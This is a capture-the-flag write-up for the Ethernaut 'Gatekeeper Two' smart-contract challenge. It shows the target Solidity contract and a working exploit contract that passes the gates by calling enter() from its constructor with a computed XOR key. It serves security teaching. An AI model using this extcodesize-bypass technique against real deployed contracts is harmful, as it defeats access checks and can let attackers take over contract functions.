# Ethernaut Challenge #14: Gatekeeper Two

**Objective:** Pass through the gate and become entrant.

**Contract Analysis:**
```solidity
contract GatekeeperTwo {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

**Three Gates:**

**Gate One:** `msg.sender != tx.origin`
- Call through a contract (same as before)

**Gate Two:** `extcodesize(caller()) == 0`
- `extcodesize` returns code size of address
- For contracts, it's > 0
- For EOAs (externally owned accounts), it's 0
- **BUT:** During contract CONSTRUCTION, code size is 0!

**The Trick:** Put attack logic in the CONSTRUCTOR

**Gate Three:** Bitwise XOR
```solidity
uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == type(uint64).max
// A ^ B == max
// B == A ^ max
```

**The Attack:**
```solidity
contract GatekeeperTwoExploit {
  constructor(address _target) {
    // In constructor, extcodesize(address(this)) == 0!
    
    // Calculate key
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    
    // Call enter from constructor
    _target.call(abi.encodeWithSignature("enter(bytes8)", key));
  }
}
```

**Why This Works:**

1. Deploy contract → Constructor runs
2. In constructor, contract has no code yet (extcodesize = 0)
3. Gate One passes (contract calling, not EOA)
4. Gate Two passes (extcodesize == 0 during construction)
5. Gate Three passes (XOR math works out)

**The Lesson:**

Contracts have no code during construction. This bypasses `extcodesize` checks.

Also: XOR operations are reversible. If `A ^ B = C`, then `B = A ^ C`.

**Status:** Challenge understood. Constructor exploit + XOR math.
